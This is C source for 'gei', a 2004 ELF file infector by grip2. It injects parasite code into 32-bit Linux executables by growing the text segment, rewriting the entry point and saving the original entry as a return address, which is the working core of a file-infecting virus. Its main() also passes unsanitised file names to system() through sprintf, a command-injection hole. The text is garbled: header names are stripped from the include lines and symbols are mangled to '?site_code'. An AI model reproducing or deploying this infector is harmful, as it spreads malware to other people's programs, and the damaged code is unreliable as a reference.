------------------------------ g-elf_infector.c ------------------------------

/*

* gei - ELF Infector v0.0.2 (2004)

* written by grip2

*/

#include

#include

#include

#include

#include

#include

#include

#include

#include "gvirus.h"

#define PAGE_SIZE 4096

#define PAGE_ALIGN(a) (((a) + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1))

static int elf_infect(const char *filename,

void *para_code,

unsigned int para_code_size,

unsigned long retaddr_addr_offset);

int main(int argc, char *argv[])

{

#define MAX_FILENAME_LEN 256

	char backup[MAX_FILENAME_LEN*4];

	char restore[MAX_FILENAME_LEN*4];

	if (argc != 2) {

		fprintf(stderr,

		"gei - ELF Infector v0.0.2 written by grip2 \n");

		fprintf(stderr, "Usage: %s \n", argv[0]);

		return 1;

	}

	if (strcmp(argv[1], "-l") == 0) {

		fprintf(stderr, "Parasite code length: %d\n",?site_code_end - ?site_code);

		return 1;

	}

	if (strlen(argv[1]) > MAX_FILENAME_LEN) {

		fprintf(stderr, "filename too long!\n");

		return 1;

	}

	sprintf(backup, "cp -f %s .backup.%s\n", argv[1], argv[1]);

	sprintf(restore, "cp -f .backup.%s %s\n", argv[1], argv[1]);

	system(backup);

	if (elf_infect(argv[1], ?site_code,

	?site_code_end - ?site_code,

	PARACODE_RETADDR_ADDR_OFFSET) < 0) {

	system(restore);

	return 1;

}

return 0;

}

static int elf_infect(const char *filename,void *para_code,unsigned int para_code_size,unsigned long retaddr_addr_offset)
{

	int fd = -1;

	int tmp_fd = -1;

	Elf32_Ehdr *ehdr = NULL;

	Elf32_Phdr *phdr;

	Elf32_Shdr *shdr;

	int i;

	int txt_index;

	struct stat stat;

	int align_code_size;

	unsigned long org_entry;

	void *new_code_pos;

	int tmp_flag;

	int size;

	unsigned char tmp_para_code[PAGE_SIZE];

	char *tmpfile;

	tmpfile = tempnam(NULL, "infector");

	fd = open(filename, O_RDWR);

	if (fd == -1) {

		perror(filename);

		goto err;

	}

	if (fstat(fd, &stat) == -1) {

		perror("fstat");

		goto err;

	}

#ifndef NDEBUG

	printf("file size: %lu\n", stat.st_size);

#endif

	ehdr = mmap(0, stat.st_size, PROT_WRITE|PROT_READ, MAP_SHARED, fd, 0);

	if (ehdr == MAP_FAILED) {

		perror("mmap ehdr");

	goto err;

	}

/* Check ELF magic-ident */

if (ehdr->e_ident[EI_MAG0] != 0x7f

|| ehdr->e_ident[EI_MAG1] != 'E'

|| ehdr->e_ident[EI_MAG2] != 'L'

|| ehdr->e_ident[EI_MAG3] != 'F'

|| ehdr->e_ident[EI_CLASS] != ELFCLASS32

|| ehdr->e_ident[EI_DATA] != ELFDATA2LSB

|| ehdr->e_ident[EI_VERSION] != EV_CURRENT

|| ehdr->e_type != ET_EXEC

|| ehdr->e_machine != EM_386

|| ehdr->e_version != EV_CURRENT

) {

fprintf(stderr, "File type not supported\n");

goto err;

}

#ifndef NDEBUG

printf("e_phoff: %08x\ne_shoff: %08x\n",ehdr->e_phoff, ehdr->e_shoff);

printf("e_phentsize: %08x\n", ehdr->e_phentsize);

printf("e_phnum: %08x\n", ehdr->e_phnum);

printf("e_shentsize: %08x\n", ehdr->e_shentsize);

printf("e_shnum: %08x\n", ehdr->e_shnum);

#endif

align_code_size = PAGE_ALIGN(para_code_size);

/* Get program header and section header start address */

phdr = (Elf32_Phdr *) ((unsigned long) ehdr + ehdr->e_phoff);

shdr = (Elf32_Shdr *) ((unsigned long) ehdr + ehdr->e_shoff);

/* Locate the text segment */

txt_index = 0;

while (1) {

if (txt_index == ehdr->e_phnum - 1) {

fprintf(stderr, "Invalid e_phnum, text segment not found.\n");

goto err;

}

if (phdr[txt_index].p_type == PT_LOAD && phdr[txt_index].p_flags == (PF_R|PF_X)) { /* text segment */

#ifndef NDEBUG

printf("text segment file offset: %u\n", phdr[txt_index].p_offset);

#endif

if (phdr[txt_index].p_vaddr + phdr[txt_index].p_filesz + align_code_size > phdr[txt_index+1].p_vaddr) {

fprintf(stderr, "Better luck next file :-)\n");

goto err;

}

break;

}

txt_index++;

}

/* Modify the entry point of the ELF */

org_entry = ehdr->e_entry;

ehdr->e_entry = phdr[txt_index].p_vaddr + phdr[txt_index].p_filesz;

new_code_pos =

(void *) ehdr + phdr[txt_index].p_offset + phdr[txt_index].p_filesz;

/* Increase the p_filesz and p_memsz of text segment * for new code */

phdr[txt_index].p_filesz += align_code_size;

phdr[txt_index].p_memsz += align_code_size;

for (i = 0; i < ehdr->e_phnum; i++)

if (phdr[i].p_offset >= (unsigned long) new_code_pos - (unsigned long) ehdr)

phdr[i].p_offset += align_code_size;

tmp_flag = 0;

for (i = 0; i < ehdr->e_shnum; i++) {

if (shdr[i].sh_offset >= (unsigned long) new_code_pos - (unsigned long) ehdr) {

shdr[i].sh_offset += align_code_size;

if (!tmp_flag && i) { /* associating the new_code to the last

* section in the text segment */

shdr[i-1].sh_size += align_code_size;

tmp_flag = 1;

printf("[%d sections patched]\n", i-1);

}

}

}

/* Increase p_shoff in the ELF header */

ehdr->e_shoff += align_code_size;

/* Make a new file */

tmp_fd = open(tmpfile, O_WRONLY|O_CREAT, stat.st_mode);

if (tmp_fd == -1) {

perror("open");

goto err;

}

size = new_code_pos - (void *) ehdr;

if (write(tmp_fd, ehdr, size) != size) {

perror("write");

goto err;

}

memcpy(tmp_para_code, para_code, para_code_size);

memcpy(tmp_para_code + retaddr_addr_offset,

&org_entry, sizeof(org_entry));

if (write(tmp_fd, tmp_para_code, align_code_size) != align_code_size) {

perror("write");

goto err;

}

if (write(tmp_fd, (void *) ehdr + size, stat.st_size - size)

!= stat.st_size - size) {

perror("write");

goto err;

}

close(tmp_fd);

munmap(ehdr, stat.st_size);

close(fd);

if (rename(tmpfile, filename) == -1) {

perror("rename");

goto err;

}

return 0;

err:

if (tmp_fd != -1)

close(tmp_fd);

if (ehdr)

munmap(ehdr, stat.st_size);

if (fd != -1)

close(fd);

return -1;

} 